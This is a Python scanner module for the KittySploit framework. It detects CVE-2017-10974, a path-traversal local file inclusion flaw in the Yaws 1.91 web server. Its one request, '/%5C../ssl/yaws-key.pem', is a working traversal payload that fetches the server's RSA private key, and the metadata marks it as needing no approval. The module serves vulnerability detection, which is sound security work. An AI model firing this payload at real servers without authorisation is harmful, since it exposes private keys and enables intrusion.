#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Yaws 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Yaws 1.91 - Local File Inclusion Detection',
        'description': 'Yaws 1.91 allows unauthenticated local file inclusion via /%5C../ submitted to port 8080.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'edb', 'yaws', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/42303',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-10974',
            'http://hyp3rlinx.altervista.org/advisories/YAWS-WEB-SERVER-v1.91-UNAUTHENTICATED-REMOTE-FILE-DISCLOSURE.txt',
            'https://www.exploit-db.com/exploits/42303/',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2017-10974',
    }

    def run(self):
        r = self.http_request(method="GET", path='/%5C../ssl/yaws-key.pem', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_any = ('<html', 'begin rsa private key',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Yaws 1.91 - Local File Inclusion detected",
                path='/%5C../ssl/yaws-key.pem',
            )
            return True
        return False

